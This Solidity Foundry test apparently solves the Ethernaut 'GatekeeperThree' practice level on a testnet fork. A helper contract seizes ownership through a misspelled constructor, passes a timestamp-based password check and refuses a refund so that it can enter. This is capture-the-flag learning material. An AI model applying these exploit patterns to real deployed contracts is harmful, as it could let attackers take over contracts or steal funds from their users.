// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {GatekeeperThree} from "../../src/Ethernaut/GatekeeperThree.sol";

contract GatekeeperThreeAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress, playerAddress);
        Helper helper = new Helper();
        GatekeeperThree gatekeeperThree = GatekeeperThree(
            payable(0xdcab3251AE7e3642dcE0627F4B41dA5b45942B92)
        );
        helper.attack{value: 0.002 ether}(gatekeeperThree);
        vm.stopPrank();
        assertTrue(gatekeeperThree.entrant() == playerAddress);
    }
}

contract Helper {
    function attack(GatekeeperThree gatekeeperThree) external payable {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        payable(gatekeeperThree).call{value: 0.002 ether}("");
        gatekeeperThree.enter();
    }

    receive() external payable {
        if (msg.value == 0.001 ether) {
            revert();
        }
    }
}
